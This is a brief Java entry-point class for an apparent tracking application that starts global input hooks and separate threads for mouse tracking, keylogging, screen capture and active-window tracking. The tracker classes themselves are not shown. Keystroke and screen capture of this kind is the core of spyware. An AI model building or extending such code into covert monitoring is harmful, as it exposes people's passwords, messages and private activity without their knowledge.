package com.example.trackingapp;

import com.example.trackingapp.Trackers.*;

public class TrackingApp {
    public static void main(String[] args) {
        GlobalHookManager.initialize();

        new Thread(MouseTracker::startTracking).start();
        new Thread(KeyLogger::startTracking).start();
        new Thread(ScreenCapture::startTracking).start();
        new Thread(ActiveWindowTracker::startTracking).start();
    }
}